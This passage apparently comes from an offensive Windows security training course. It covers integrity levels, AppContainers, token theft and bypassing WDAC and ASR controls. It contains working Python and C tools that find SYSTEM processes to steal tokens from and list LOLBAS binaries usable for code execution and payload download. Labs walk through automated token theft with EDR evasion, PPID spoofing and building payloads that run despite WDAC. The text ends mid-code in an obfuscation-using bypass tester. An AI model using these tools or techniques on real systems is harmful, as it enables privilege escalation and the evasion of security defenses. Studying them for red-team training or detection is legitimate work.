        advapi32.GetSidSubAuthority.argtypes = [ctypes.c_void_p, wt.DWORD]
        pRid = advapi32.GetSidSubAuthority(pSid, count - 1)
        rid = pRid.contents.value

        try:
            level_name = IntegrityLevel(rid).name
        except ValueError:
            level_name = f"UNKNOWN(0x{rid:04X})"

        kernel32.CloseHandle(hToken)
        if close_process:
            kernel32.CloseHandle(hProcess)
        return rid, level_name

    kernel32.CloseHandle(hToken)
    if close_process:
        kernel32.CloseHandle(hProcess)
    return None, "GetTokenInformation failed"

def get_privileges():
    """Enumerate privileges of current process token."""
    # Get real handle to current process
    hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, kernel32.GetCurrentProcessId())
    if not hProcess:
        return []

    hToken = wt.HANDLE()
    if not advapi32.OpenProcessToken(hProcess, TOKEN_QUERY, ctypes.byref(hToken)):
        kernel32.CloseHandle(hProcess)
        return []

    dwSize = wt.DWORD()
    advapi32.GetTokenInformation(hToken, TokenPrivileges, None, 0, ctypes.byref(dwSize))

    buf = ctypes.create_string_buffer(dwSize.value)
    advapi32.GetTokenInformation(hToken, TokenPrivileges, buf, dwSize, ctypes.byref(dwSize))

    tp = ctypes.cast(buf, ctypes.POINTER(TOKEN_PRIVILEGES))
    privileges = []

    for i in range(min(tp.contents.PrivilegeCount, 64)):
        name_buf = ctypes.create_string_buffer(256)
        name_len = wt.DWORD(256)
        advapi32.LookupPrivilegeNameA(
            None,
            ctypes.byref(tp.contents.Privileges[i].Luid),
            name_buf,
            ctypes.byref(name_len)
        )
        attrs = tp.contents.Privileges[i].Attributes
        enabled = bool(attrs & SE_PRIVILEGE_ENABLED)
        privileges.append({
            "name": name_buf.value.decode(),
            "enabled": enabled
        })

    kernel32.CloseHandle(hToken)
    kernel32.CloseHandle(hProcess)
    return privileges

def check_appcontainer():
    """Check if current process is in an AppContainer."""
    hProcess = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, kernel32.GetCurrentProcessId())
    if not hProcess:
        return False

    hToken = wt.HANDLE()
    if not advapi32.OpenProcessToken(hProcess, TOKEN_QUERY, ctypes.byref(hToken)):
        kernel32.CloseHandle(hProcess)
        return False

    is_ac = wt.DWORD()
    dwSize = wt.DWORD(ctypes.sizeof(is_ac))
    advapi32.GetTokenInformation(
        hToken, TokenIsAppContainer,
        ctypes.byref(is_ac), dwSize, ctypes.byref(dwSize)
    )

    kernel32.CloseHandle(hToken)
    kernel32.CloseHandle(hProcess)
    return bool(is_ac.value)

def enumerate_system_processes():
    """Find SYSTEM processes suitable for token theft."""
    try:
        # Try PowerShell with full path
        ps_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        if not os.path.exists(ps_path):
            ps_path = "powershell.exe"

        result = subprocess.run(
            [ps_path, "-NoProfile", "-Command",
             "Get-Process | Select-Object Id,ProcessName | ConvertTo-Json"],
            capture_output=True, text=True, timeout=10
        )

        targets = ["winlogon", "lsass", "services", "csrss", "smss"]
        found = []

        procs = json.loads(result.stdout)
        for proc in procs:
            name = proc.get("ProcessName", "").lower()
            if name in targets:
                found.append({"pid": proc["Id"], "name": proc["ProcessName"]})

        return found
    except (json.JSONDecodeError, TypeError, FileNotFoundError, subprocess.TimeoutExpired):
        # Fallback: use tasklist
        try:
            result = subprocess.run(
                ["tasklist", "/FO", "CSV", "/NH"],
                capture_output=True, text=True, timeout=10
            )

            targets = ["winlogon.exe", "lsass.exe", "services.exe", "csrss.exe", "smss.exe"]
            found = []

            for line in result.stdout.strip().split('\n'):
                parts = line.strip('"').split('","')
                if len(parts) >= 2:
                    name = parts[0].lower()
                    if name in targets:
                        try:
                            pid = int(parts[1])
                            found.append({"pid": pid, "name": parts[0]})
                        except ValueError:
                            pass

            return found
        except:
            return []

def sandbox_assessment():
    """Complete sandbox and token security assessment."""
    print("=" * 60)
    print("  SANDBOX & TOKEN SECURITY ASSESSMENT")
    print("=" * 60)

    # Integrity level
    rid, level = get_integrity_level()
    print(f"\n[*] Integrity Level: {level} (0x{rid:04X})" if rid else f"\n[-] {level}")

    # AppContainer
    is_ac = check_appcontainer()
    print(f"[*] AppContainer:    {'YES - SANDBOXED' if is_ac else 'No'}")

    # Privileges
    privs = get_privileges()
    offensive_privs = [
        "SeDebugPrivilege", "SeImpersonatePrivilege",
        "SeAssignPrimaryTokenPrivilege", "SeTcbPrivilege",
        "SeBackupPrivilege", "SeRestorePrivilege",
        "SeLoadDriverPrivilege", "SeTakeOwnershipPrivilege"
    ]

    print(f"\n[*] Privileges ({len(privs)} total):")
    for p in privs:
        marker = "***" if p["name"] in offensive_privs else "   "
        status = "ENABLED" if p["enabled"] else "disabled"
        print(f"  {marker} {p['name']:40s} [{status}]")

    # Attack path assessment
    print(f"\n{'=' * 60}")
    print("  ATTACK PATH ASSESSMENT")
    print(f"{'=' * 60}")

    priv_names = {p["name"] for p in privs}

    if rid and rid >= IntegrityLevel.HIGH:
        print("\n  [+] HIGH integrity - can attempt token theft from SYSTEM")
        if "SeDebugPrivilege" in priv_names:
            print("  [+] SeDebugPrivilege available - direct token theft possible")
            targets = enumerate_system_processes()
            if targets:
                print(f"  [+] SYSTEM process targets:")
                for t in targets:
                    print(f"      {t['name']} (PID {t['pid']})")
        else:
            print("  [-] SeDebugPrivilege missing - need to enable first")

    if "SeImpersonatePrivilege" in priv_names:
        print("  [+] SeImpersonatePrivilege present")
        print("      Note: Traditional Potato attacks don't work on Windows 11 24H2")
        print("      Reason: EFSRPC service not installed, enhanced COM security")
        print("      Alternative: Token theft from SYSTEM processes")
    elif "SeAssignPrimaryTokenPrivilege" in priv_names:
        print("  [+] SeAssignPrimaryToken - Token assignment attack viable")

    if rid and rid <= IntegrityLevel.LOW:
        print("\n  [!] LOW integrity - limited write access")
        print("      Writable: %LOCALAPPDATA%\\Low, %TEMP%\\Low")
        print("      Readable: Most user files (No-Write-Up only)")
        print("      Escape:   Exploit Medium-IL service or COM interface")

    if is_ac:
        print("\n  [!] APPCONTAINER - heavily sandboxed!")
        print("      Escape requires: Broker exploit, COM abuse, or kernel vuln")
        print("      Next step: Enumerate available COM objects and broker interfaces")

    print(f"\n{'=' * 60}")

if __name__ == "__main__":
    if sys.platform != "win32":
        print("[-] This tool requires Windows")
        sys.exit(1)
    sandbox_assessment()
```

### Practical Exercise

**Lab 4.1: Integrity Level Analysis**

1. Compile and run `integrity_level_tool.c` to analyze current process IL
2. Observe the automated Low-IL process spawn and restriction testing
3. Compare Medium-IL vs Low-IL write capabilities to user profile and registry
4. Document which locations are writable from Low IL (owner rights override IL)

**Lab 4.2: AppContainer Sandbox Testing**

1. Compile and run `appcontainer_analysis.c` to create an AppContainer process
2. From the spawned AppContainer cmd.exe, attempt file access: `type %USERPROFILE%\Desktop\test.txt`
3. Try network access: `ping 8.8.8.8` (should fail without internetClient capability)
4. Use Process Explorer to verify AppContainer SID in the process token

**Lab 4.3: Token Theft from SYSTEM Processes**

1. Run `token_sandbox_analyzer.py` to enumerate SYSTEM processes and assess privileges
2. Compile and run `token_stealth.exe` as Administrator to perform automated token theft
3. Verify SYSTEM access in the spawned cmd.exe: `whoami` and `whoami /priv`
4. Observe OPSEC features: EDR detection, target scoring, stealth delays

**Lab 4.4: Token Manipulation Techniques**

1. Compile and run `token_manipulation.c` to inspect your current token
2. Use option [1] to steal a token from another process (try different PIDs)
3. Use option [2] to demonstrate PPID spoofing with a target parent PID
4. Verify spoofed parent in Process Explorer's process tree view

**Lab 4.5: Modern Windows 11 24H2 Reality Check**

1. Attempt to locate EFSRPC service: `sc query efsrpc` (not found on 24H2)
2. Verify traditional Potato attacks fail due to missing EFSRPC
3. Confirm token theft from SYSTEM processes is the viable alternative
4. Document why SeDebugPrivilege + token theft replaced Potato techniques

### Key Takeaways

- **Integrity levels are the first sandbox layer** - but No-Write-Up only by default (read access preserved)
- **AppContainers are significantly stronger** than IL alone - default deny for network, files, IPC
- **Token theft from SYSTEM processes** is the primary privilege escalation path on modern Windows
- **Traditional Potato attacks don't work on Windows 11 24H2** - EFSRPC service removed, enhanced COM security
- **SeDebugPrivilege enables direct token theft** - target selection matters (avoid protected processes)
- **PPID spoofing bypasses monitoring** - process tree analysis becomes unreliable
- **Process attributes control child security** - mitigation policy, AC assignment, parent spoofing
- **Broker process bugs** are the main AppContainer escape vector (critical for Week 12)
- **OPSEC considerations** - EDR detection, target scoring, timing delays affect success rates

### Discussion Questions

1. Why does Windows default to No-Write-Up rather than No-Read-Up for integrity levels?
2. How does AppContainer isolation compare to Linux namespaces and seccomp-bpf?
3. Why did Microsoft remove EFSRPC from Windows 11 24H2, and what does this tell us about the Potato attack family's impact?
4. How would you detect token theft from SYSTEM processes in a SOC environment? What telemetry would you monitor?
5. What makes broker processes such an attractive attack target for AppContainer escapes?
6. Why is target selection important for token theft? What makes winlogon.exe a better target than lsass.exe from an OPSEC perspective?
7. How does PPID spoofing defeat parent-child process relationship monitoring? What alternative detection methods exist?
8. On Windows 11 24H2, if SeImpersonatePrivilege is available but Potato attacks fail, what's the most reliable privilege escalation path?

## Day 5: WDAC and Attack Surface Reduction (ASR) Bypass

- **Goal**: Understand and bypass Windows Defender Application Control (WDAC) and Attack Surface Reduction (ASR) rules - the OS-level policies that decide whether your code is _allowed to execute at all_.
- **Activities**:
  - _Reading_:
    - [App Control for Business design guide](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/wdac-design-guide)
    - [Microsoft - ASR Rules Reference](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference)
    - [LOLBAS Project](https://lolbas-project.github.io/) - Living Off the Land Binaries and Scripts
  - _Online Resources_:
    - [SpecterOps - Subverting Trust in Windows](https://www.youtube.com/watch?v=wxmxxgL6Nz8) - CI policy bypass
    - [WDAC Bypass Catalog](https://github.com/bohops/UltimateWDACBypassList) - Community-maintained bypass list
    - [Red Teaming in the EDR Age](https://www.youtube.com/watch?v=l8nkXCOYQC4) - Practical signing
    - [Windows Internals - Code Integrity](https://www.microsoftpressstore.com/store/windows-internals-part-2-9780135462331)
  - _Tool Setup_:
    - WDAC Policy Wizard (Microsoft Store)
    - CITool.exe (Windows 11 built-in)
    - signtool.exe (Windows SDK)
    - WDACme (auditing tool)
  - _Exercise_:
    - Deploy a WDAC policy in audit mode
    - Test known WDAC bypass techniques (LOLBAS, catalog signing)
    - Enable ASR rules and test bypass methods
    - Build a payload that executes despite WDAC enforcement

WDAC and ASR represent the OS-level _execution policy_ layer. They answer the question: **"Is this binary/script allowed to run?"** - before any exploit mitigation (DEP, ASLR, CFG) even comes into play.

### Context: WDAC vs AppLocker vs ASR

```text
┌───────────────────────────────────────────────────────────────┐
│         Windows Execution Control Landscape                   │
├───────────────────────────────────────────────────────────────┤
│                                                               │
│  WDAC (Windows Defender Application Control):                 │
│  ─────────────────────────────────────────────                │
│  ├── Kernel-enforced code integrity (CI.dll, CiValidateImage) │
│  ├── Controls: executables, DLLs, scripts, drivers            │
│  ├── Policy types: Base + Supplemental                        │
│  ├── Trust based on: signer, hash, path, publisher            │
│  ├── Cannot be bypassed by admin (kernel-enforced!)           │
│  └── Strongest execution control on Windows                   │
│                                                               │
│  AppLocker (Legacy):                                          │
│  ───────────────────                                          │
│  ├── User-mode enforcement (AppIDSvc service)                 │
│  ├── Controls: EXE, DLL, Script, MSI, AppX                    │
│  ├── Rules: Publisher, Path, Hash                             │
│  ├── CAN be bypassed by admin (stop service)                  │
│  └── Being superseded by WDAC                                 │
│                                                               │
│  ASR (Attack Surface Reduction):                              │
│  ───────────────────────────────                              │
│  ├── Behavior-based rules (not binary allow/deny)             │
│  ├── Blocks specific attack techniques                        │
│  ├── Examples: "Block Office creating child processes"        │
│  │            "Block PsExec/WMI process creation"             │
│  │            "Block credential stealing from LSASS"          │
│  ├── Managed via Intune/GPO                                   │
│  └── Complements WDAC - different layer                       │
│                                                               │
│  RELATIONSHIP:                                                │
│  WDAC = "WHAT can run" (binary-level allow/deny)              │
│  ASR  = "HOW it can behave" (technique-level blocking)        │
│  Both are OS policies, NOT exploit mitigations                │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

### Deliverables

- [ ] Understand the difference between WDAC, AppLocker, and ASR
- [ ] Deploy and analyze a WDAC policy
- [ ] Execute code despite WDAC enforcement using at least 2 bypass techniques
- [ ] Bypass at least 3 ASR rules

### WDAC Architecture and Enforcement

```c
// wdac_analyzer.c - Enumerate WDAC/CI policy status
// Compile: cl src\wdac_analyzer.c /Fe:bin\wdac_analyzer.exe advapi32.lib wintrust.lib shlwapi.lib

#include <windows.h>
#include <wintrust.h>
#include <softpub.h>
#include <shlwapi.h>
#include <mscat.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")

/*
WDAC Enforcement Architecture:
══════════════════════════════

User request (run EXE) -> CreateProcess -> NtCreateSection
   -> CI!CiValidateImageHeader (KERNEL MODE)
      -> Load active CI policy
      -> Check signer chain + page hashes + WDAC rules
      -> ALLOW or DENY (STATUS_INVALID_IMAGE_HASH = 0xC0000604)

Key insight: WDAC is enforced in KERNEL mode.
Admin cannot disable it (unlike AppLocker).
Must find policy gaps or trusted-binary abuse.
*/

// ── Registry-based CI status query ──────────────────────────

typedef struct _CI_STATUS {
    BOOL umciEnabled;       // User-Mode Code Integrity
    BOOL umciAuditMode;     // Audit vs Enforce
    BOOL hvciEnabled;       // Hypervisor Code Integrity
    BOOL vbsEnabled;        // Virtualization Based Security
    BOOL secureBootEnabled;
} CI_STATUS;

BOOL QueryCIStatus(CI_STATUS* status) {
    HKEY hKey;
    DWORD val, size;
    LONG ret;

    memset(status, 0, sizeof(CI_STATUS));

    // Check CI enforcement via Control\CI registry key
    ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\CI", 0, KEY_READ, &hKey);
    if (ret == ERROR_SUCCESS) {
        size = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "UMCIAuditMode", NULL, NULL,
                            (LPBYTE)&val, &size) == ERROR_SUCCESS) {
            status->umciAuditMode = (val == 1);
            status->umciEnabled = TRUE;
        }
        RegCloseKey(hKey);
    }

    // Check Device Guard / VBS status
    ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard", 0, KEY_READ, &hKey);
    if (ret == ERROR_SUCCESS) {
        size = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "EnableVirtualizationBasedSecurity",
                            NULL, NULL, (LPBYTE)&val, &size) == ERROR_SUCCESS) {
            status->vbsEnabled = (val == 1);
        }
        if (RegQueryValueExA(hKey, "HypervisorEnforcedCodeIntegrity",
                            NULL, NULL, (LPBYTE)&val, &size) == ERROR_SUCCESS) {
            status->hvciEnabled = (val == 1);
        }
        RegCloseKey(hKey);
    }

    // Check Secure Boot
    ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State", 0, KEY_READ, &hKey);
    if (ret == ERROR_SUCCESS) {
        size = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "UEFISecureBootEnabled",
                            NULL, NULL, (LPBYTE)&val, &size) == ERROR_SUCCESS) {
            status->secureBootEnabled = (val == 1);
        }
        RegCloseKey(hKey);
    }

    return TRUE;
}

// ── Active CI policy file enumeration ───────────────────────

void EnumeratePolicyFiles() {
    printf("\n=== Active CI Policy Files ===\n\n");

    const char* policyPaths[] = {
        "C:\\Windows\\System32\\CodeIntegrity\\SiPolicy.p7b",
        "C:\\Windows\\System32\\CodeIntegrity\\CiPolicies\\Active\\",
        NULL
    };

    // Check legacy single-policy file
    if (GetFileAttributesA(policyPaths[0]) != INVALID_FILE_ATTRIBUTES) {
        WIN32_FILE_ATTRIBUTE_DATA fad;
        GetFileAttributesExA(policyPaths[0], GetFileExInfoStandard, &fad);
        printf("  [+] SiPolicy.p7b: PRESENT (%d bytes)\n",
               fad.nFileSizeLow);
        printf("      -> Legacy single WDAC policy (pre-1903)\n");
    } else {
        printf("  [ ] SiPolicy.p7b: Not present\n");
    }

    // Enumerate multiple policy files (Windows 10 1903+ / Windows 11)
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(
        "C:\\Windows\\System32\\CodeIntegrity\\CiPolicies\\Active\\*.cip", &fd);

    int policyCount = 0;
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            policyCount++;
            printf("  [+] Policy: %s (%d bytes)\n",
                   fd.cFileName, fd.nFileSizeLow);

            // Check if it's a supplemental policy (GUID-based name)
            if (strchr(fd.cFileName, '{')) {
                printf("      -> Supplemental policy (GUID-based)\n");
                printf("      -> BYPASS NOTE: Supplemental policies can EXPAND trust\n");
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }

    if (policyCount == 0)
        printf("  [ ] No .cip policy files in Active directory\n");
    else
        printf("  [*] Total active policies: %d\n", policyCount);
}

// ── Verify Authenticode signature of a binary ───────────────

BOOL VerifyCatalogSignature(const wchar_t* filePath, DWORD* pErrorCode) {
    *pErrorCode = 0;

    HANDLE hFile = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        *pErrorCode = GetLastError();
        return FALSE;
    }

    // First call to get hash size
    DWORD hashSize = 0;
    CryptCATAdminCalcHashFromFileHandle(hFile, &hashSize, NULL, 0);

    if (hashSize == 0 || hashSize > 256) {
        *pErrorCode = 1; // Hash size error
        CloseHandle(hFile);
        return FALSE;
    }

    // Allocate and calculate actual hash
    BYTE hash[256];
    if (!CryptCATAdminCalcHashFromFileHandle(hFile, &hashSize, hash, 0)) {
        *pErrorCode = GetLastError();
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);

    // Acquire catalog context
    HCATADMIN hCatAdmin = NULL;
    if (!CryptCATAdminAcquireContext(&hCatAdmin, NULL, 0)) {
        *pErrorCode = GetLastError();
        return FALSE;
    }

    // Search for catalog containing this file's hash
    HCATINFO hCatInfo = CryptCATAdminEnumCatalogFromHash(hCatAdmin, hash, hashSize, 0, NULL);

    BOOL isSigned = (hCatInfo != NULL);

    if (hCatInfo) {
        CryptCATAdminReleaseCatalogContext(hCatAdmin, hCatInfo, 0);
    }

    CryptCATAdminReleaseContext(hCatAdmin, 0);
    return isSigned;
}

const char* VerifyBinarySignature(const wchar_t* filePath) {
    WINTRUST_FILE_INFO fileInfo = {0};
    fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
    fileInfo.pcwszFilePath = filePath;

    GUID policyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;

    WINTRUST_DATA trustData = {0};
    trustData.cbStruct = sizeof(WINTRUST_DATA);
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.pFile = &fileInfo;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.dwProvFlags = WTD_SAFER_FLAG;

    LONG result = WinVerifyTrust(NULL, &policyGUID, &trustData);

    // Clean up state
    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &policyGUID, &trustData);

    // If no embedded signature, check catalog signature
    if (result == TRUST_E_NOSIGNATURE) {
        DWORD catalogError = 0;
        if (VerifyCatalogSignature(filePath, &catalogError)) {
            return "SIGNED (Catalog)";
        }
        // Uncomment for debugging:
        // printf("      [DEBUG] Catalog check failed: error %d\n", catalogError);
    }

    switch (result) {
        case ERROR_SUCCESS:
            return "SIGNED (Embedded)";
        case TRUST_E_NOSIGNATURE:
            return "UNSIGNED";
        case TRUST_E_EXPLICIT_DISTRUST:
            return "EXPLICITLY DISTRUSTED";
        case CRYPT_E_SECURITY_SETTINGS:
            return "BLOCKED BY POLICY";
        case TRUST_E_SUBJECT_NOT_TRUSTED:
            return "SIGNED (Untrusted)";
        default:
            return "UNKNOWN STATUS";
    }
}

// ── Scan for LOLBAS bypass binaries ─────────────────────────

void ScanLOLBASBypassOpportunities() {
    printf("\n=== LOLBAS Bypass Binary Availability ===\n\n");

    // These Microsoft-signed binaries can execute arbitrary code
    // If present and not blocked by WDAC policy, they're bypass vectors
    struct { const wchar_t* path; const char* name; const char* technique; } lolbas[] = {
        { L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
          "MSBuild.exe", "Compile+execute inline C# from .csproj" },
        { L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
          "InstallUtil.exe", "Execute .NET assembly via /U uninstall" },
        { L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
          "csc.exe", "Compile C# on-disk then execute" },
        { L"C:\\Windows\\System32\\mshta.exe",
          "mshta.exe", "Execute HTA with embedded VBScript/JScript" },
        { L"C:\\Windows\\System32\\wscript.exe",
          "wscript.exe", "Execute VBScript/JScript files" },
        { L"C:\\Windows\\System32\\cmstp.exe",
          "cmstp.exe", "Execute DLL via INF ScriptExtension" },
        { L"C:\\Windows\\System32\\msiexec.exe",
          "msiexec.exe", "Execute DLL payload from MSI" },
        { L"C:\\Windows\\System32\\certutil.exe",
          "certutil.exe", "Download + decode payloads" },
        { L"C:\\Windows\\System32\\rundll32.exe",
          "rundll32.exe", "Execute exported DLL function" },
        { L"C:\\Windows\\System32\\regsvr32.exe",
          "regsvr32.exe", "Scriptlet execution via /s /i:URL" },
    };

    for (int i = 0; i < _countof(lolbas); i++) {
        BOOL exists = (GetFileAttributesW(lolbas[i].path) != INVALID_FILE_ATTRIBUTES);
        const char* sigStatus = exists ?
            VerifyBinarySignature(lolbas[i].path) : "N/A";

        printf("  %s %-18s  Sig: %-20s  Technique: %s\n",
               exists ? "[+]" : "[-]",
               lolbas[i].name,
               sigStatus,
               lolbas[i].technique);
    }
}

// ── Check ASR rule enforcement ──────────────────────────────

void CheckASRRules() {
    printf("\n=== ASR Rule Enforcement Status ===\n\n");

    // ASR rules are stored in this registry key
    HKEY hKey;
    LONG ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\"
        "Windows Defender Exploit Guard\\ASR\\Rules",
        0, KEY_READ, &hKey);

    if (ret != ERROR_SUCCESS) {
        // Try alternative path
        ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows Defender\\"
            "Windows Defender Exploit Guard\\ASR\\Rules",
            0, KEY_READ, &hKey);
    }

    struct { const char* guid; const char* name; } asrRules[] = {
        { "D4F940AB-401B-4EFC-AADC-AD5F3C50688A", "Block Office child processes" },
        { "3B576869-A4EC-4529-8536-B80A7769E899", "Block Office creating executables" },
        { "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84", "Block Office code injection" },
        { "D3E037E1-3EB8-44C8-A917-57927947596D", "Block PsExec/WMI process creation" },
        { "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2", "Block credential theft from LSASS" },
        { "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550", "Block executable content from email" },
        { "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC", "Block downloads of executable content" },
        { "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B", "Block Win32 API from Office macros" },
        { "26190899-1602-49E8-8B27-EB1D0A1CE869", "Block Office COM object creation" },
        { "7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C", "Block Adobe Reader child processes" },
    };

    if (ret == ERROR_SUCCESS) {
        for (int i = 0; i < _countof(asrRules); i++) {
            DWORD val = 0, size = sizeof(DWORD);
            char valStr[16] = {0};
            DWORD valStrSize = sizeof(valStr);

            // ASR rules can be DWORD or string values
            DWORD type = 0;
            ret = RegQueryValueExA(hKey, asrRules[i].guid, NULL, &type,
                                  (LPBYTE)valStr, &valStrSize);

            const char* mode = "Not configured";
            if (ret == ERROR_SUCCESS) {
                // Value is a string: "0"=disabled, "1"=block, "2"=audit, "6"=warn
                int v = atoi(valStr);
                switch (v) {
                    case 0: mode = "DISABLED"; break;
                    case 1: mode = "BLOCK"; break;
                    case 2: mode = "AUDIT"; break;
                    case 6: mode = "WARN"; break;
                    default: mode = "UNKNOWN"; break;
                }
            }

            printf("  %-8s %s\n", mode, asrRules[i].name);
        }
        RegCloseKey(hKey);
    } else {
        printf("  [*] ASR rules not configured via Group Policy\n");
        printf("  [*] May be managed via Intune/MDE - check:\n");
        printf("      Get-MpPreference | Select *asr*\n");
    }
}

// ── Test binary execution against WDAC ──────────────────────

void TestBinaryExecution(const char* testExePath) {
    printf("\n=== WDAC Execution Test: %s ===\n\n", testExePath);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    // Attempt to create process - WDAC denies at NtCreateSection
    if (CreateProcessA(testExePath, NULL, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("  [+] CreateProcess SUCCEEDED - binary ALLOWED by CI policy\n");
        printf("      PID: %d\n", pi.dwProcessId);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        DWORD err = GetLastError();
        printf("  [-] CreateProcess FAILED - error %d\n", err);
        if (err == 225) {  // ERROR_VIRUS_INFECTED
            printf("      -> Blocked by Windows Defender / AMSI\n");
        } else if (err == 1260) {  // ERROR_ACCESS_DISABLED_BY_POLICY
            printf("      -> Blocked by WDAC/AppLocker POLICY\n");
            printf("      -> STATUS_INVALID_IMAGE_HASH at CI layer\n");
        } else if (err == 5) {
            printf("      -> Access denied (check permissions)\n");
        }
    }
}

int main(int argc, char* argv[]) {
    printf("===========================\n");
    printf("WDAC/CI Policy Analyzer    \n");
    printf("===========================\n\n");

    // Phase 1: Query CI enforcement status from registry
    printf("=== Code Integrity Enforcement Status ===\n\n");
    CI_STATUS ci = {0};
    QueryCIStatus(&ci);

    printf("  UMCI (User-Mode CI):  %s\n",
           ci.umciEnabled ? (ci.umciAuditMode ? "AUDIT MODE" : "ENFORCED") : "DISABLED");
    printf("  HVCI (Kernel CI):     %s\n", ci.hvciEnabled ? "ENABLED" : "DISABLED");
    printf("  VBS:                  %s\n", ci.vbsEnabled ? "ENABLED" : "DISABLED");
    printf("  Secure Boot:          %s\n", ci.secureBootEnabled ? "ENABLED" : "DISABLED");

    if (!ci.umciEnabled) {
        printf("\n  [!] UMCI not enforced - WDAC is NOT blocking usermode binaries\n");
        printf("  [!] Any EXE/DLL will execute regardless of signature\n");
    } else if (ci.umciAuditMode) {
        printf("\n  [!] UMCI in AUDIT mode - violations logged but NOT blocked\n");
        printf("  [!] Check Event Viewer: Applications and Services > Microsoft\n");
        printf("      > Windows > CodeIntegrity > Operational (Event ID 3076)\n");
    } else {
        printf("\n  [*] UMCI ENFORCED - unsigned/untrusted code BLOCKED\n");
        printf("  [*] Need LOLBAS, DLL sideloading, or signing bypass\n");
    }

    if (ci.hvciEnabled) {
        printf("  [!] HVCI enabled - unsigned kernel drivers BLOCKED\n");
        printf("  [!] BYOVD limited to HVCI-compatible signed drivers\n");
    }

    // Phase 2: Enumerate active policy files
    EnumeratePolicyFiles();

    // Phase 3: Scan for LOLBAS bypass opportunities
    ScanLOLBASBypassOpportunities();

    // Phase 4: Check ASR enforcement
    CheckASRRules();

    // Phase 5: Test specific binary if provided
    if (argc > 1) {
        TestBinaryExecution(argv[1]);
    }

    printf("\n==========================================\n");
    printf("ATTACK STRATEGY BASED ON FINDINGS:\n");
    if (!ci.umciEnabled) {
        printf("  -> No WDAC - execute any unsigned payload directly\n");
    } else if (ci.umciAuditMode) {
        printf("  -> Audit mode - execute payload, check logs for stealth\n");
    } else {
        printf("  -> WDAC enforced. Priority bypass paths:\n");
        printf("     1. LOLBAS (MSBuild/InstallUtil) if available\n");
        printf("     2. DLL sideloading via trusted signed EXE\n");
        printf("     3. Managed Installer abuse (if SCCM/Intune)\n");
        printf("     4. Supplemental policy injection (if allowed)\n");
        printf("     5. Signed binary with known vuln (BYOVDLL)\n");
    }
    printf("=============================================\n");

    return 0;
}
```

### WDAC Bypass

#### Technique 1: MSBuild Inline Task Execution

```c
// wdac_bypass_tester.c
// Compile: cl src\wdac_bypass_tester.c /Fe:bin\wdac_bypass_tester.exe user32.lib
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <tlhelp32.h>

#pragma comment(lib, "user32.lib")

void XorObfuscate(char* data, size_t len, BYTE key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

void GenerateRandomName(char* buffer, size_t size) {
    const char* prefixes[] = {"Build", "Config", "Setup", "Update", "Install", "Deploy"};
    const char* suffixes[] = {"Task", "Helper", "Manager", "Service", "Handler", "Worker"};
    srand((unsigned int)time(NULL) + GetTickCount());
    snprintf(buffer, size, "%s%s%d",
             prefixes[rand() % 6],
             suffixes[rand() % 6],
             rand() % 9999);
}

BOOL IsProcessRunning(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    BOOL found = FALSE;
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                found = TRUE;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return found;
}

void ListAllProcesses() {
